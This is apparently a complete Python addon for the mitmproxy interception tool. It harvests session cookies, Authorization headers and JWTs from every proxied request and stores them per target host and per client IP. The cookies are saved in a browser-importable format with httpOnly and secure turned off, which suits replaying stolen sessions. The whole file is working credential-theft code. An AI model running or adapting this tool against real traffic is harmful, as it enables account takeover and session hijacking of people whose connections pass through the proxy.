#!/usr/bin/env python3
"""
Token and authentication data extraction functionality.
"""

import json
import re
from datetime import datetime
from typing import Dict, List, Set
from pathlib import Path
from mitmproxy import http, ctx

try:
    from config import EXTRACT_DIR, JWT_REGEX, DEBUG_LOG
except ImportError:
    # Standalone config fallbacks
    OUT_DIR = Path.cwd() / "Mitmproxy_Outputs"
    EXTRACT_DIR = OUT_DIR / "Tokens"
    JWT_REGEX = re.compile(r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+')
    DEBUG_LOG = OUT_DIR / "Other" / "debug.log"

def normalize_ip(ip: str) -> str:
    """Normalize IP address by removing special characters."""
    if not ip:
        return "unknown"
    return ip.replace(":", "_").replace("[", "").replace("]", "")

def get_client_ip(flow: http.HTTPFlow) -> str:
    """Extract client IP from flow with fallback chain."""
    if not flow or not flow.client_conn:
        return "unknown"
    
    if flow.request:
        real_ip = flow.request.headers.get("X-Real-IP")
        if real_ip:
            return normalize_ip(real_ip)
        
        forwarded_for = flow.request.headers.get("X-Forwarded-For")
        if forwarded_for:
            ip = forwarded_for.split(",")[0].strip()
            if ip:
                return normalize_ip(ip)
    
    if flow.client_conn.peername:
        return normalize_ip(flow.client_conn.peername[0])
    
    return "unknown"

def debug_log(message: str) -> None:
    """Write debug message to log file and mitmproxy log."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{timestamp}] {message}"
    try:
        DEBUG_LOG.parent.mkdir(parents=True, exist_ok=True)
        with open(DEBUG_LOG, "a") as f:
            f.write(log_message + "\n")
    except Exception:
        pass
    
    try:
        if hasattr(ctx, 'log') and ctx.log:
            ctx.log.info(f"[DEBUG] {message}")
    except (AttributeError, NameError):
        pass


class TokenExtractor:
    """Extracts and saves authentication tokens from HTTP traffic."""
    
    def __init__(self):
        # Ensure directory exists
        EXTRACT_DIR.mkdir(parents=True, exist_ok=True)

    def extract_from_request(self, flow: http.HTTPFlow) -> None:
        """
        Extract tokens and cookies from HTTP request.
        
        Args:
            flow: HTTP flow object
        """
        host = flow.request.host
        client_ip = get_client_ip(flow)
        
        data: Dict = {}
        
        # Extract cookies
        cookies = flow.request.cookies.items()
        cookie_list = [
            {
                "domain": "." + host,
                "name": name,
                "value": value,
                "path": "/",
                "httpOnly": False,
                "secure": False
            } 
            for name, value in cookies
        ]
        
        if cookie_list:
            data["cookies"] = cookie_list
        
        # Extract authorization header
        auth = flow.request.headers.get("authorization", "")
        if auth:
            data["authorization"] = auth
            jwts = JWT_REGEX.findall(auth)
            if jwts:
                data["jwts"] = jwts
        
        # Extract JWTs from URL and body
        extra_jwts = JWT_REGEX.findall(flow.request.pretty_url + flow.request.text)
        if extra_jwts:
            data.setdefault("jwts", []).extend(extra_jwts)
        
        # Save if we found anything
        if data:
            self._save_token_data(host, client_ip, data)
    
    def _save_token_data(self, host: str, client_ip: str, data: Dict) -> None:
        """
        Save token data to JSON file.
        
        Args:
            host: Target host
            client_ip: Client IP address
            data: Token data dictionary
        """
        current_date = datetime.now().strftime("%Y-%m-%d")
        domain_dir = EXTRACT_DIR / current_date / host
        domain_dir.mkdir(parents=True, exist_ok=True)
        json_path = domain_dir / f"{client_ip}.json"
        
        try:
            # Load existing data
            if json_path.exists():
                with open(json_path) as f:
                    existing = json.load(f)
            else:
                existing = {}
            
            # Merge cookies (deduplicate by name)
            if "cookies" in data:
                old_cookies = {c["name"]: c for c in existing.get("cookies", [])}
                for c in data["cookies"]:
                    old_cookies[c["name"]] = c
                existing["cookies"] = list(old_cookies.values())
            
            # Update authorization
            if "authorization" in data:
                existing["authorization"] = data["authorization"]
            
            # Merge JWTs (deduplicate)
            if "jwts" in data:
                existing_jwts: Set[str] = set(existing.get("jwts", []))
                new_jwts: Set[str] = set(data["jwts"])
                existing["jwts"] = list(existing_jwts | new_jwts)
            
            # Atomic write
            temp_file = json_path.with_suffix('.tmp')
            with open(temp_file, "w") as f:
                json.dump(existing, f, indent=2)
            temp_file.replace(json_path)
            
        except Exception as e:
            debug_log(f"Error saving token data: {e}")


class TokenExtractorAddon:
    """Mitmproxy addon for token extraction."""
    
    def __init__(self):
        self.token_extractor = TokenExtractor()
        debug_log("TokenExtractorAddon initialized")

    def request(self, flow: http.HTTPFlow) -> None:
        """Handle incoming requests - extract tokens."""
        try:
            # Get client IP
            client_ip = get_client_ip(flow)
            
            # Extract tokens
            self.token_extractor.extract_from_request(flow)
            
            debug_log(f"Processing request from {client_ip} to {flow.request.pretty_url}")
            
        except Exception as e:
            debug_log(f"Error in request handler: {e}")

addons = [TokenExtractorAddon()]
